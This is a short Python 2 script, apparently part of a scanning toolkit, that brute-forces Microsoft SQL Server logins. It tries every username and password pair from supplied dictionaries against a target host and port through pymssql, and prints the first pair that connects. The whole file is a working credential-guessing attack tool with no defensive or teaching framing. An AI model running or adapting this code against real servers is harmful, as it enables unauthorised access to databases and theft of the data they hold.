#!/usr/bin/env python
# -*- coding: utf-8 -*-
import pymssql

def explode(host,port,dic):
    # print dic
    usernameDic = dic['username']
    passwordDic = dic['password']
    for username in usernameDic:
        for passwd in passwordDic:
            if connectToDB(host,port,username,passwd):
                print '\33[33m'+host+':mssql\t'+'username:'+username+'\tpassword:'+passwd+'\33[37m'
                return

def connectToDB(host,port,username,passwd):
    db = None
    try:
        db = pymssql.connect(host=host, user=username, passwd=passwd,port=port)
        return True
    except:
        return False
